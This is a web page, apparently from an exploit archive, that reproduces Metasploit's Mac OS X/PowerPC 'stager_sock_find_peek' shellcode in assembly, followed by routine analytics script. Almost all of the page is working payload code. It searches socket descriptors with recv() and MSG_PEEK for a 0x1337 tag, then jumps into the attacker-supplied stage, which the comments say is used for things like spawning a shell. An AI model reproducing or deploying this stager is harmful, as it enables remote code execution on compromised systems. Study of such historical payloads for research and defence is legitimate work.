<html><head><title>Osx/ppc - stager sock find peek</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
;;
;
;        Name: stager_sock_find_peek
;   Qualities: Null-Free
;   Platforms: MacOS X / PPC
;     Authors: H D Moore &lt; hdm [at] metasploit.com &gt;
;     Version: $Revision: 1.1 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload will recv() downward until the read
;        data contains the search tag (0xXXXX1337). Once the
;        tag is located, it will jump into the payload. The
;        recv() call is passed the MSG_PEEK flag, the stage
;        will need to flush the recv() queue before doing
;        something like dup2'ing a shell.
;
;;

.globl _main
.text
_main:
	li		r29, 0xfff
	li		r30, 0xfff
	addic.	r28, r29, -0xfff +1

findsock:
	subf.   r30, r28, r30
	blt		_main

	subi	r0, r29, 0xfff - 102
	mr		r3, r30
	subi	r4, r1, 4104
	li		r5, 4095
	subi	r6, r29, 0xfff - 0x82
	.long	0x44ffff02
	xor.	r6, r6, r6
	
	lhz		r27, -4104(r1)
	cmpwi	r27, 0x1337
	bne		findsock

gotsock:
	subi	r4, r1, 4100
	mtctr	r4
	blectr	
	xor.	r6, r6, r6


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
